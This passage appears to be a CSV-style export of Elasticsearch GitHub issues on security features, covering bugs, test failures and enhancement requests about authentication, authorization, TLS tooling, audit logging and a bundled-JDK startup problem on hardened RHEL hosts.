```","Pinging @elastic/es-security (Team:Security)",no,">test-failure,:Security/Authorization,Team:Security,"
elastic/elasticsearch,317448615,"Security: Upgrade of x-pack does not warn of changes to config/x-pack/log4j.properties","*Original comment by @robin13:*

In elasticsearch 5.0.0 `config/x-pack/log4j.properties` contained the line
```
appender.audit_rolling.fileName = ${sys:es.logs}_access.log
```

This is not compatible with elasticsearch 6.1.1 and causes the startup error:

```
2018-01-02 14:50:49,034 main ERROR Unable to create file ${sys:es.logs}_access.log java.io.IOException: Permission denied
```

The correct line is:

```
appender.audit_rolling.fileName = ${sys:es.logs.base_path}${sys:file.separator}${sys:es.logs.cluster_name}_access.log
```

This line is included in later versions of elasticsearch (5.6.4 at least), *but* it seems that when you remove / install the x-pack plugin (e.g. in my tests upgrading from 5.0.0 incrementally via intermediary versions all the way to 6.1.1), the necessary change to the `log4j.properties` file is not made, and there is no warning of the diff or any option given to overwrite with the newer file.
As user changes to the `log4j.properties` file are to be expected, I would not expect the file to be overwritten automatically (and silently), but it would be good if a diff to the default is seen, options are given (similar to when using `apt-get` or similar package managers) to retain existing, view diff, or overwrite with default.",,no,">bug,:Security/Security,Team:Security,"
elastic/elasticsearch,954427590,"Cant used elasticsearch-set-password on docker-swarm mode","First ,i create elasticsearch single mode on docker swarm cluster.
When  i want to create password  and follow up document .
i found  that command ' ./bin/elasticseach/elasticsearch-set-password auto -v' can't  get response .
This screenshot show the reason . 
![image](https://user-images.githubusercontent.com/35675091/127257135-144cdcbf-e064-4f76-a5dc-e7a3f0eebe4d.png)

I  think elasticsearch should use elasicsearch default overlay net work , instead of  used ingress ip address .
","Thanks for the interest in Elasticsearch!

I acknowledge there's a problem that the `elasticsearch-setup-passwords` tools doesn't have a good way to select the address that it uses to do its job. It's on our list of things to improve.

Related https://github.com/elastic/elasticsearch/issues/68435 https://github.com/elastic/elasticsearch/issues/75663Pinging @elastic/es-security (Team:Security)",no,">bug,:Security/Security,Team:Security,"
elastic/elasticsearch,317448944,"Improve error messages if non-native user tries to change password","*Original comment by @tvernum:*

At the moment if a non-native user (e.g. File realm) tries to change their own password you get:
```
{
  ""error"": {
    ""root_cause"": [
      {
        ""type"": ""security_exception"",
        ""reason"": ""action [cluster:admin/xpack/security/user/change_password] is unauthorized for user [tim]""
      }
    ],
    ""type"": ""security_exception"",
    ""reason"": ""action [cluster:admin/xpack/security/user/change_password] is unauthorized for user [tim]""
  },
  ""status"": 403
}
```

If a superuser tries to change that user's password they get:
```
{
  ""error"": {
    ""root_cause"": [
      {
        ""type"": ""validation_exception"",
        ""reason"": ""Validation Failed: 1: user must exist in order to change password;""
      }
    ],
    ""type"": ""validation_exception"",
    ""reason"": ""Validation Failed: 1: user must exist in order to change password;""
  },
  ""status"": 400
}
```

Neither message is an accurate description of the root cause which is that the user is not a native (API-managed) user.",,no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317447863,"certgen tool deletes an existing bundle","*Original comment by @tsullivan:*

Version: 6.0.0-beta1-SNAPSHOT

1. Use the certgen tool to create a certificate bundle
2. The certificate bundle is correctly created
3. Re-run the command using the same bundle name and instance name
4. An exception appears:
   ``` 
   Exception in thread ""main"" java.nio.file.FileAlreadyExistsException: /Users/tsullivan/build/v6/elasticsearch-6.0.0-beta1-SNAPSHOT/certificate-bundle.zip
        at sun.nio.fs.UnixException.translateToIOException(UnixException.java:88)
        at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102)
        at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107)
        at sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:214)
        at java.nio.file.spi.FileSystemProvider.newOutputStream(FileSystemProvider.java:434)
        at java.nio.file.Files.newOutputStream(Files.java:216)
        at org.elasticsearch.xpack.ssl.CertificateTool.fullyWriteFile(CertificateTool.java:402)
        at org.elasticsearch.xpack.ssl.CertificateTool.generateAndWriteSignedCertificates(CertificateTool.java:364)
        at org.elasticsearch.xpack.ssl.CertificateTool.execute(CertificateTool.java:170)
        at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:74)
        at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:122)
        at org.elasticsearch.cli.Command.main(Command.java:88)
        at org.elasticsearch.xpack.ssl.CertificateTool.main(CertificateTool.java:149)

   ```
5. The certificate that was created in step 2 is deleted","*Original comment by @ppf2:*

+1.  Would like to see that we check for file exists at the beginning of the certgen steps instead of at the end.  This way, users will not be frustrated esp. if they have to generate the certs again not realizing the package is already at the bundle location (for a previous run), go generate 10+ nodes and then end up getting a file already exists error.

Or maybe the script can be smarter and name the new .zip automatically (with a timestamp) if it detects an existing bundle with the same name and provide the path to the new .zip at the end instead of just terminating.",no,">bug,:Security/TLS,Team:Security,"
elastic/elasticsearch,833803328,"bad_record_mac in fips test","**Build scan**: https://gradle-enterprise.elastic.co/s/k4opo7gqbocx4/tests/:x-pack:plugin:security:internalClusterTest/org.elasticsearch.xpack.security.transport.ssl.SslMultiPortTests/testThatProfileTransportClientCannotConnectToDefaultProfile?expanded-stacktrace=WyIwIl0#1

**Repro line**:
```
./gradlew ':x-pack:plugin:security:internalClusterTest' \
  --tests ""org.elasticsearch.xpack.security.transport.ssl.SslMultiPortTests.testThatProfileTransportClientCannotConnectToDefaultProfile"" \
  -Dtests.seed=3D1042FE5DA6D1A8 -Dtests.security.manager=true -Dtests.locale=ar-EG \
  -Dtests.timezone=Pacific/Samoa -Druntime.java=15 -Dtests.fips.enabled=true
```

**Reproduces locally?**: No

**Applicable branches**: 7.12

**Failure history**:
There was [another](https://gradle-enterprise.elastic.co/s/s6lcccwgbv6ea/tests/:x-pack:plugin:security:internalClusterTest/org.elasticsearch.xpack.security.transport.ssl.SslMultiPortTests/testThatProfileTransportClientCanConnectToNoClientAuthProfile#1) failure of the same test a week ago but it doesn't look related.

**Failure excerpt**:
https://gist.github.com/nik9000/ca56fd787c1e8fde3291da87ddc39296

","Pinging @elastic/es-security (Team:Security)",no,">test-failure,Team:Security,:Security/FIPS,"
elastic/elasticsearch,438345736,"Clean up resources shared between x-pack core and security","There are a large number of certificates that we have checked in as test resources. Both the x-pack core and security projects have the same paths and many of the same names for certificates and keystores. However, the content has diverged in some of the files. This would be fine if the projects were completely separated but as it stands the [core resources are copied into the security source set for tests](https://github.com/elastic/elasticsearch/blob/e49dd06a2b96527c80e73e5909800f17d85f65fe/x-pack/plugin/security/build.gradle#L139-L142). This can lead to confusing failures if you are not aware of this and do not know which file is actually being used, which happened to me while working on cipher changes for JDK 11.

We should either remove the sharing of these resources or only keep them in core so that we do not have this situation where files diverge and we're unsure of which files are being used.","Pinging @elastic/es-security",no,":Security/Security,Team:Security,"
elastic/elasticsearch,317454271,"Field stats slowdown with xpack security","*Original comment by @jaymode:*

From: https://discuss.elastic.co/t/kibana-slow-work-with-x-pack/67372

This has not been narrowed down to an issue in elasticsearch or kibana yet as both are in play. 

The user has attached screenshots of browser based network requests and the time difference for field stats requests is significant, 3+ seconds with security vs ~20ms without security enabled.

I've been unable to reproduce with just elasticsearch so far. My first suspect was the disabling of caching when field level security is in play, but the user says that the elastic user is being used and I could not find a bug where field level security would be enabled even in the presence of anonymous roles with field level security.

","*Original comment by @jaymode:*

Also to note, the pattern that is slow queries 98 indices with sizes up to 30gb. Each index has 5 shards, and total size of the indices is about 1.13TB on a single node. Along the same lines a user reported this with just kibana https://github.com/elastic/kibana/issues/9386*Original comment by @jaymode:*

I did some profiling and looks like Automatons can cause a significant slowdown. I used apache bench to issue requests as the elastic user and a user with field level security enabled. The role with field level security was slower, but not as significantly as when anonymous access is enabled with a role that uses field level security. Dumping the threads and profiling, the most time was spent in minimization of automatons",no,">bug,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1150976862,"Remote clusters only allowing a whitelist pattern of indices even for superusers","### Description

While setting up cross-cluster search there was a bit of confusion as to lock down the visible indices. As a `superuser` setting this up I kept seeing all of the indices regardless of the filters I thought were in place.  I later learned that the role on the local cluster is associated with the same role on the remote cluster.  This may be confusing to an admin since it is more complicated to validate the permissions.  But more importantly, clusters being set up as a remote may not really trust the local cluster as much as you'd hope and have different administrative teams and even be in different organizations.

Here are some suggestions:
- Do not inherit the index patterns for built-in roles for remote clusters, since roles such as `superuser` can't be adjusted.
- Have a place to configure a master list of patterns that need to overlap with roles for cross-cluster searching to minimize the indices available to ""trusted"" clusters.  This would ensure that even `superuser` would be restricted to just all of this limited list.  This would preferably be done on the remote cluster to prevent the local admin from opening this up more, although even having it on the local cluster when configuring the remote would still be an improvement.

I'm using Elastic 7.13.2, but my understanding is that this hasn't changed in more recent 7.x versions.","Pinging @elastic/es-security (Team:Security)Relates: https://github.com/elastic/elasticsearch/issues/41181",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,786343264,"The manage SLM priv grants permissions to stop ILM","The `manage_slm` cluster privilege grants permission to stop and start **ILM**. This seems unnecessary.
I think it should grant permissions to start and stop **SLM** instead.

Can someone from @elastic/es-core-features confirm, please?","Pinging @elastic/es-security (Team:Security)@albertzaharovits this is a leftover from back when starting/stopping ILM also started or stopped SLM, they've since been separated, so this should be fixed.",no,">bug,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1098082743,"[Elasticsearch] Update audit event documentation for system_access_granted","Collecting system_access_granted audit related logs can be extremely chatty as mentioned within the reference guide for audit related events:  https://www.elastic.co/guide/en/elasticsearch/reference/current/audit-event-types.html.  Could we somehow enhance the documentation to provide a means of controlling who is actually being treated as an internal user when system_access_granted in enabled?  Maybe have an additional configuration option within:  xpack.security.audit.logfile.events.include

","Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)>Could we somehow enhance the documentation to provide a means of controlling who is actually being treated as an internal user when system_access_granted in enabled? Maybe have an additional configuration option within: xpack.security.audit.logfile.events.include

@agopiola, can you clarify what change you would like to see in the documentation? Are you asking for an example snippet for `system_access_granted` similar to the other parameters? Greetings @lockewritesdocs -- I am also adding @a03nikki to provide some additional detail to this request.",no,">enhancement,:Security/Audit,Team:Security,"
elastic/elasticsearch,1149905622,"ES 8.0 RPM Install - libjli.so cannot be located launching scripts/binaries from the bin directory - RHEL 8","### Elasticsearch Version

8.0

### Installed Plugins

_No response_

### Java Version

_bundled_

### OS Version

Linux 4.18.0-348.12.2.el8_5.x86_64 #1 SMP Mon Jan 17 07:06:06 EST 2022 x86_64 x86_64 x86_64 GNU/Linux

### Problem Description

I am deploying a new ES cluster running 8.0 using RHEL 8.5. Fairly vanilla deployment and Elasticsearch is running on the first node with auto-security used, no JVM installed (using built-in). SELINUX is permissive.

Elastic is launching using systemd and I am able to query the cluster information:

```
{
  ""name"" : ""es-mstr-01.corp.nklab.com.au"",
  ""cluster_name"" : ""nkl-prd-es-clr-01"",
  ""cluster_uuid"" : ""zpb0mWSGSVSVvByeZ-fl4w"",
  ""version"" : {
    ""number"" : ""8.0.0"",
    ""build_flavor"" : ""default"",
    ""build_type"" : ""rpm"",
    ""build_hash"" : ""1b6a7ece17463df5ff54a3e1302d825889aa1161"",
    ""build_date"" : ""2022-02-03T16:47:57.507843096Z"",
    ""build_snapshot"" : false,
    ""lucene_version"" : ""9.0.0"",
    ""minimum_wire_compatibility_version"" : ""7.17.0"",
    ""minimum_index_compatibility_version"" : ""7.0.0""
  },
  ""tagline"" : ""You Know, for Search""
}
```

When I attempt to run any of the scripts in the bin folder to generate tokens for adding the additional nodes I receive the following:

```
[template@es-mstr-01 ~]$ cd /usr/share/elasticsearch/bin
[template@es-mstr-01 bin]$ sudo ./elasticsearch-create-enrollment-token -s node
/usr/share/elasticsearch/jdk/bin/java: error while loading shared libraries: libjli.so: cannot open shared object file: No such file or directory
[template@es-mstr-01 bin]$ ./elasticsearch-create-enrollment-token -s node
./elasticsearch-env: line 83: /usr/share/elasticsearch/jdk/bin/java: Operation not permitted
```

Additionally, the following output can be seen when attempting to locate libjli.so:

```
[template@es-mstr-01 bin]$ locate libjli.so
/usr/share/elasticsearch/jdk/lib/libjli.so
[template@es-mstr-01 bin]$ sudo ldd /usr/share/elasticsearch/jdk/bin/java
	linux-vdso.so.1 (0x00007ffeb3bf4000)
	libz.so.1 => /lib64/libz.so.1 (0x00007f1f7e6bf000)
	libjli.so => /usr/share/elasticsearch/jdk/bin/../lib/libjli.so (0x00007f1f7e4ae000)
	libpthread.so.0 => /lib64/libpthread.so.0 (0x00007f1f7e28e000)
	libdl.so.2 => /lib64/libdl.so.2 (0x00007f1f7e08a000)
	libc.so.6 => /lib64/libc.so.6 (0x00007f1f7dcc5000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f1f7ead9000)
[template@es-mstr-01 bin]$
```

Any ideas would be greatly appreciated. I have also attempted to add the path using ldconfig but this made no difference.

First lodged in community forums [here](https://discuss.elastic.co/t/es-8-0-rpm-install-libjli-so-cannot-be-located-launching-scripts-binaries-from-the-bin-directory-rhel-8/298105)



### Steps to Reproduce

```
[template@es-mstr-01 ~]$ cd /usr/share/elasticsearch/bin
[template@es-mstr-01 bin]$ sudo ./elasticsearch-create-enrollment-token -s node
/usr/share/elasticsearch/jdk/bin/java: error while loading shared libraries: libjli.so: cannot open shared object file: No such file or directory
[template@es-mstr-01 bin]$ ./elasticsearch-create-enrollment-token -s node
./elasticsearch-env: line 83: /usr/share/elasticsearch/jdk/bin/java: Operation not permitted
```


### Logs (if relevant)

_No response_","Pinging @elastic/es-delivery (Team:Delivery)Pinging @elastic/es-security (Team:Security)Is it possible to run Java on its own? (I'm expecting no, but it's worth checking):

    ./jdk/bin/java -version

What are the permissions on the directories and files?

    ls -l /usr/share/elasticsearch
    ls -l /usr/share/elasticsearch/lib

Have you tried disabling SELinux entirely? That would tell us whether the issue lies with SELinux, even if it is in permissive mode.> Is it possible to run Java on its own? (I'm expecting no, but it's worth checking):

No Java was installed, I have installed the latest RHEL 8.5 repo JDK and this made no difference.

```
[nkelly@es-mstr-01 ~]$ java --version
openjdk 17.0.2 2022-01-18 LTS
OpenJDK Runtime Environment 21.9 (build 17.0.2+8-LTS)
OpenJDK 64-Bit Server VM 21.9 (build 17.0.2+8-LTS, mixed mode, sharing)
```

> What are the permissions on the directories and files?

```
[nkelly@es-mstr-01 ~]$ ls -l /usr/share/elasticsearch
total 860
drwxr-xr-x.  2 root root   4096 Feb 24 11:53 bin
drwxr-xr-x.  9 root root    121 Feb 23 13:50 jdk
drwxr-xr-x.  3 root root   4096 Feb 23 13:50 lib
-rw-r--r--.  1 root root   3860 Feb  4 02:47 LICENSE.txt
drwxr-xr-x. 66 root root   4096 Feb 23 13:50 modules
-rw-rw-r--.  1 root root 858789 Feb  4 02:52 NOTICE.txt
drwxr-xr-x.  2 root root      6 Feb  4 02:55 plugins
-rw-r--r--.  1 root root   2710 Feb  4 02:47 README.asciidoc
[nkelly@es-mstr-01 ~]$ ls -l /usr/share/elasticsearch/lib
total 28488
-rw-r--r--. 1 root root    18427 Jan  6 03:51 ecs-logging-core-1.2.0.jar
-rw-r--r--. 1 root root 13739943 Feb  4 02:49 elasticsearch-8.0.0.jar
-rw-r--r--. 1 root root    27243 Feb  4 02:48 elasticsearch-cli-8.0.0.jar
-rw-r--r--. 1 root root    61254 Feb  4 02:48 elasticsearch-core-8.0.0.jar
-rw-r--r--. 1 root root    53650 Feb  4 02:48 elasticsearch-geo-8.0.0.jar
-rw-r--r--. 1 root root    45227 Feb  4 02:52 elasticsearch-launchers-8.0.0.jar
-rw-r--r--. 1 root root  1770639 Feb  4 02:50 elasticsearch-log4j-8.0.0.jar
-rw-r--r--. 1 root root    26653 Feb  4 02:48 elasticsearch-lz4-8.0.0.jar
-rw-r--r--. 1 root root    14322 Feb  4 02:48 elasticsearch-plugin-classloader-8.0.0.jar
-rw-r--r--. 1 root root    19016 Feb  4 02:48 elasticsearch-secure-sm-8.0.0.jar
-rw-r--r--. 1 root root   174548 Feb  4 02:48 elasticsearch-x-content-8.0.0.jar
-rw-r--r--. 1 root root   114165 May 11  2020 HdrHistogram-2.1.9.jar
-rw-r--r--. 1 root root  1159086 May 11  2020 hppc-0.8.1.jar
-rw-r--r--. 1 root root   349273 May 11  2020 jackson-core-2.10.4.jar
-rw-r--r--. 1 root root    58567 May 11  2020 jackson-dataformat-cbor-2.10.4.jar
-rw-r--r--. 1 root root    90817 May 11  2020 jackson-dataformat-smile-2.10.4.jar
-rw-r--r--. 1 root root    46788 May 11  2020 jackson-dataformat-yaml-2.10.4.jar
-rw-r--r--. 1 root root    16319 Feb  4 02:48 java-version-checker-8.0.0.jar
-rw-r--r--. 1 root root  1756400 Nov 24 19:22 jna-5.10.0.jar
-rw-r--r--. 1 root root    78074 May 11  2020 jopt-simple-5.0.2.jar
-rw-r--r--. 1 root root    26669 Jan  6 03:51 log4j2-ecs-layout-1.2.0.jar
-rw-r--r--. 1 root root   301872 Jan  5 19:38 log4j-api-2.17.1.jar
-rw-r--r--. 1 root root  1847266 Jan  6 03:51 lucene-analysis-common-9.0.0.jar
-rw-r--r--. 1 root root   491440 Jan  6 03:51 lucene-backward-codecs-9.0.0.jar
-rw-r--r--. 1 root root  3452680 Jan  6 03:51 lucene-core-9.0.0.jar
-rw-r--r--. 1 root root    96925 Jan  6 03:51 lucene-grouping-9.0.0.jar
-rw-r--r--. 1 root root   265536 Jan  6 03:51 lucene-highlighter-9.0.0.jar
-rw-r--r--. 1 root root   154128 Jan  6 03:51 lucene-join-9.0.0.jar
-rw-r--r--. 1 root root    47747 Jan  6 03:51 lucene-memory-9.0.0.jar
-rw-r--r--. 1 root root    95553 Jan  6 03:51 lucene-misc-9.0.0.jar
-rw-r--r--. 1 root root   493728 Jan  6 03:51 lucene-queries-9.0.0.jar
-rw-r--r--. 1 root root   374128 Jan  6 03:51 lucene-queryparser-9.0.0.jar
-rw-r--r--. 1 root root   242158 Jan  6 03:51 lucene-sandbox-9.0.0.jar
-rw-r--r--. 1 root root   312790 Jan  6 03:51 lucene-spatial3d-9.0.0.jar
-rw-r--r--. 1 root root   235638 Jan  6 03:51 lucene-suggest-9.0.0.jar
-rw-r--r--. 1 root root   682804 Jul  2  2021 lz4-java-1.8.0.jar
-rw-r--r--. 1 root root   309001 May 11  2020 snakeyaml-1.26.jar
-rw-r--r--. 1 root root    51208 May 11  2020 t-digest-3.2.jar
drwxr-xr-x. 7 root root      101 Feb 23 13:50 tools

```

> Have you tried disabling SELinux entirely? That would tell us whether the issue lies with SELinux, even if it is in permissive mode.

Yes, this made no difference.
> No Java was installed, I have installed the latest RHEL 8.5 repo JDK and this made no difference.

Yes, but Elasticsearch is not configured to use that JDK. By default it uses the JDK bundled with Elasticsearch itself. So what we _actually_ want to test is `/usr/share/elasticsearch/jdk/bin/java -version`. Alternatively you can set `ES_JAVA_HOME` to the location of the JDK you installed form the RHEL repo and see if that works.> Yes, but Elasticsearch is not configured to use that JDK. By default it uses the JDK bundled with Elasticsearch itself. So what we _actually_ want to test is `/usr/share/elasticsearch/jdk/bin/java -version`.

```
[nkelly@es-mstr-01 ~]$ /usr/share/elasticsearch/jdk/bin/java -version
-bash: /usr/share/elasticsearch/jdk/bin/java: Operation not permitted
[nkelly@es-mstr-01 ~]$ sudo /usr/share/elasticsearch/jdk/bin/java -version
/usr/share/elasticsearch/jdk/bin/java: error while loading shared libraries: libjli.so: cannot open shared object file: No such file or directory

```

> Alternatively you can set ES_JAVA_HOME to the location of the JDK you installed from the RHEL repo and see if that works.

```
[template@es-mstr-01 bin]$ export ES_JAVA_HOME=/usr/bin/java
[template@es-mstr-01 bin]$ sh ./elasticsearch-create-enrollment-token -s node
could not find java in ES_JAVA_HOME at /usr/bin/java/bin/java
[template@es-mstr-01 bin]$ export ES_JAVA_HOME=/usr/bin
[template@es-mstr-01 bin]$ sh ./elasticsearch-create-enrollment-token -s node
could not find java in ES_JAVA_HOME at /usr/bin/bin/java
[template@es-mstr-01 bin]$ export ES_JAVA_HOME=/usr
[template@es-mstr-01 bin]$ sh ./elasticsearch-create-enrollment-token -s node

ERROR: could not write file [/etc/elasticsearch/users_roles]

[template@es-mstr-01 bin]$ sudo sh ./elasticsearch-create-enrollment-token -s node
/usr/share/elasticsearch/jdk/bin/java: error while loading shared libraries: libjli.so: cannot open shared object file: No such file or directory

```

I also updated the systemd ES_JAVA_HOME path and confirmed that elasticsearch still starts correctly.
> I also updated the systemd ES_JAVA_HOME path and confirmed that elasticsearch still starts correctly.

I'm a bit confused. It doesn't seem as though that worked. `ES_JAVA_HOME` should point to the location of the JDK, not just the `java` binary. Also, since it seems you need elevated permissions for some of these actions you'll need to pass `-E` to `sudo` for the `ES_JAVA_HOME` environment variable to persist.Apologies for delay.

The following has enabled me to use the binaries:

```ES_JAVA_HOME``` set to ```/usr``` after installing java-17-openjdk and executing the binaries with ```sudo -E```.

It would be nice to be able to just use the bundled JRE for both running elastic search and using the binaries.So as I understand it, Elasticsearch itself managed by systemd starts up and runs fine using the bundled JDK but when running any of the CLI tools is when you find the issue? Sounds like just a file permissions issue. @pugnascotia maybe we need to tweak something here so that folks other than the `elasticsearch` user can utilize the bundled JDK?I'll see if I can replicate this.I am running into the exact same issue on Rocky Linux 8.6 while trying to setup ES 8.3 from the yum repo. It installs and I can start the service with no issue without installing java at all, but as soon as I try to execute a script from the /usr/share/elasticsearch/bin directory it says the shared libraries are not there.

Update: Mine is, for the moment at least, temporarily fixed. I installed ES without applying the RHEL STIG first and it works as expected. Something in the STIG is causing the issue for ES, have not identified it yet.So after some digging, I found that my issue was related to the File Access Policy Daemon blocking access to the files.

https://www.redhat.com/en/blog/stop-unauthorized-applications-rhel-8s-file-access-policy-daemon
> So after some digging, I found that my issue was related to the File Access Policy Daemon blocking access to the files.
> 
> https://www.redhat.com/en/blog/stop-unauthorized-applications-rhel-8s-file-access-policy-daemon

Thank you, it was the same issue for me. Once I reverted/tweaked those STIG settings, this problem went away.",no,">bug,:Delivery/Packaging,:Security/Security,Team:Security,Team:Delivery,"
elastic/elasticsearch,788153504,"[CI] SearchGroupsResolverInMemoryTests.testResolveWithDefaultUserAttribute fails","**Build scan**:
https://gradle-enterprise.elastic.co/s/ej2mf566bjwak
**Repro line**:
```
./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.authc.ldap.SearchGroupsResolverInMemoryTests.testResolveWithDefaultUserAttribute"" -Dtests.seed=CF0DE4EC556A2B26 -Dtests.security.manager=true -Dtests.locale=mt -Dtests.timezone=Pacific/Bougainville -Druntime.java=8
```
**Reproduces locally?**:
no
**Applicable branches**:
7.10
**Failure history**:
<!--
Link to build stats and possible indication of when this started failing and how often it fails
<https://build-stats.elastic.co/app/kibana>
-->
**Failure excerpt**:
```
10:12:05   2> UncategorizedExecutionException[Failed execution]; nested: ExecutionException[LDAPException(resultCode=81 (server down), errorMessage='The connection to the directory server was closed while waiting for a response to an asynchronous request.', ldapSDKVersion=4.0.8, revision=28812)]; nested: LDAPException[The connection to the directory server was closed while waiting for a response to an asynchronous request.];
10:12:05         at __randomizedtesting.SeedInfo.seed([CF0DE4EC556A2B26:9786988522002C7B]:0)
10:12:05         at org.elasticsearch.common.util.concurrent.FutureUtils.rethrowExecutionException(FutureUtils.java:91)
10:12:05         at org.elasticsearch.common.util.concurrent.FutureUtils.get(FutureUtils.java:61)
10:12:05         at org.elasticsearch.action.support.AdapterActionFuture.actionGet(AdapterActionFuture.java:37)
10:12:05         at org.elasticsearch.xpack.security.authc.ldap.SearchGroupsResolverInMemoryTests.resolveGroups(SearchGroupsResolverInMemoryTests.java:163)
10:12:05         at org.elasticsearch.xpack.security.authc.ldap.SearchGroupsResolverInMemoryTests.testResolveWithDefaultUserAttribute(SearchGroupsResolverInMemoryTests.java:88)
10:12:05 
10:12:05         Caused by:
10:12:05         java.util.concurrent.ExecutionException: LDAPException(resultCode=81 (server down), errorMessage='The connection to the directory server was closed while waiting for a response to an asynchronous request.', ldapSDKVersion=4.0.8, revision=28812)
10:12:05             at org.elasticsearch.common.util.concurrent.BaseFuture$Sync.getValue(BaseFuture.java:273)
10:12:05             at org.elasticsearch.common.util.concurrent.BaseFuture$Sync.get(BaseFuture.java:260)
10:12:05             at org.elasticsearch.common.util.concurrent.BaseFuture.get(BaseFuture.java:87)
10:12:05             at org.elasticsearch.common.util.concurrent.FutureUtils.get(FutureUtils.java:56)
10:12:05             ... 3 more
10:12:05 
10:12:05             Caused by:
10:12:05             LDAPException(resultCode=81 (server down), errorMessage='The connection to the directory server was closed while waiting for a response to an asynchronous request.', ldapSDKVersion=4.0.8, revision=28812)
10:12:05                 at org.elasticsearch.xpack.security.authc.ldap.support.LdapUtils.toException(LdapUtils.java:407)
10:12:05                 at org.elasticsearch.xpack.security.authc.ldap.support.LdapUtils.access$200(LdapUtils.java:53)
10:12:05                 at org.elasticsearch.xpack.security.authc.ldap.support.LdapUtils$LdapSearchResultListener.searchResultReceived(LdapUtils.java:514)
10:12:05                 at com.unboundid.ldap.sdk.AsyncSearchHelper.responseReceived(AsyncSearchHelper.java:220)
10:12:05                 at com.unboundid.ldap.sdk.LDAPConnectionReader.closeInternal(LDAPConnectionReader.java:1023)
10:12:05                 at com.unboundid.ldap.sdk.LDAPConnectionReader.close(LDAPConnectionReader.java:969)
10:12:05                 at com.unboundid.ldap.sdk.LDAPConnectionInternals.close(LDAPConnectionInternals.java:655)
10:12:05                 at com.unboundid.ldap.sdk.LDAPConnection.setClosed(LDAPConnection.java:4635)
10:12:05                 at com.unboundid.ldap.sdk.LDAPConnectionReader.closeInternal(LDAPConnectionReader.java:1002)
10:12:05                 at com.unboundid.ldap.sdk.LDAPConnectionReader.run(LDAPConnectionReader.java:404)
```


might be relevant (root cause?):
```
10:12:03 Unable to receive command from client socket connection from /127.0.0.1:59240 to /127.0.0.1:59242. Discarding connection.
10:12:03 org.gradle.internal.remote.internal.MessageIOException: Could not read message from '/127.0.0.1:59242'.
10:12:03 	at org.gradle.internal.remote.internal.inet.SocketConnection.receive(SocketConnection.java:94)
10:12:03 	at org.gradle.launcher.daemon.server.SynchronizedDispatchConnection.receive(SynchronizedDispatchConnection.java:70)
10:12:03 	at org.gradle.launcher.daemon.server.DefaultDaemonConnection$1.run(DefaultDaemonConnection.java:65)
10:12:03 	at org.gradle.internal.concurrent.ExecutorPolicy$CatchAndRecordFailures.onExecute(ExecutorPolicy.java:64)
10:12:03 	at org.gradle.internal.concurrent.ManagedExecutorImpl$1.run(ManagedExecutorImpl.java:48)
10:12:03 	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130)
10:12:03 	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:630)
10:12:03 	at org.gradle.internal.concurrent.ThreadFactoryImpl$ManagedThreadRunnable.run(ThreadFactoryImpl.java:56)
10:12:03 	at java.base/java.lang.Thread.run(Thread.java:832)
10:12:03 Caused by: java.lang.IllegalArgumentException: Unexpected type tag 48 found.
10:12:03 	at org.gradle.internal.serialize.DefaultSerializerRegistry$TaggedTypeSerializer.read(DefaultSerializerRegistry.java:145)
10:12:03 	at org.gradle.internal.serialize.Serializers$StatefulSerializerAdapter$1.read(Serializers.java:36)
10:12:03 	at org.gradle.internal.remote.internal.inet.SocketConnection.receive(SocketConnection.java:81)
10:12:03 	... 8 more
10:12:03 
```

","Pinging @elastic/es-security (Team:Security)Another instance of this failure: https://gradle-enterprise.elastic.co/s/yivm4jzsk6jym
This test failed 5 times in the last 90 days.",no,">test-failure,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317447702,"Make high level named Privileges a union of lower level ones ","*Original comment by @tvernum:*

_Sorry for the vague title, I had trouble naming this one_

At the moment we define cluster and index privileges via Automatons that make action names.

It's effective, but it creates a couple of places where the actual implementation doesn't match the typical user's expectations.

On indices, we define 4 levels of ""write"" access: `create`, `index`, `delete`, `write`

The theory is that:
- `create` is `IndexAction`, `PutMappingAction` and `BulkAction` (but only for bulk indexing)
- `index` is `create`, plus `UpdateAction` and `UpdateByQueryAction`, and allows bulk updates
- `delete` is `DeleteAction`, `DeleteByQueryAction` and `BulkAction` (for deletes only)
- `write` is `index` plus `delete`
   
But currently, `ReindexAction` isn't allowed by any of the first 3, but is allowed by `write` so to grant `Reindex` you have to grant `write`.
By implication, having `index` + `delete` is not technically the same as having `write` and the new `_has_privileges` API recognises that and responds accordingly.

It would be good if we could define `write` to simply be a union of the lower-level privilege names. Probably that means making `index` allow `ReindexAction` and then defining `write` to _literally_ mean: `index` and `delete`.

We also need to look at:
- Is `index:all` the same as `read` + `write` + `manage` ?
- Is `cluster:all` the same as `manage` + `manage_security` ?
 
It's possible there's others that need to be defined that way, but those are the ones we know about.
",,no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1157414809,"Duplicate tests for realm config wiring: JwtRealmAuthIT vs SecurityRealmSettingsTests ","### Description

Question (@justincr-elastic):

Why are there duplicate integration tests for checking realm config wiring?

[x-pack/plugin/security/qa/smoke-test-all-realms/build.gradle](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/qa/smoke-test-all-realms/build.gradle#L52) (Used by [JwtRealmAuthIT.java)](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/qa/smoke-test-all-realms/src/javaRestTest/java/org/elasticsearch/xpack/security/authc/RealmInfoIT.java#L23)
```
  setting 'xpack.security.authc.realms.file.file0.order', '0'
  setting 'xpack.security.authc.realms.native.native1.order', '1'
  setting 'xpack.security.authc.realms.ldap.ldap2.order', '2'
  setting 'xpack.security.authc.realms.active_directory.ad3.order', '3'
  setting 'xpack.security.authc.realms.pki.pki4.order', '4'
  setting 'xpack.security.authc.realms.saml.saml5.order', '5'
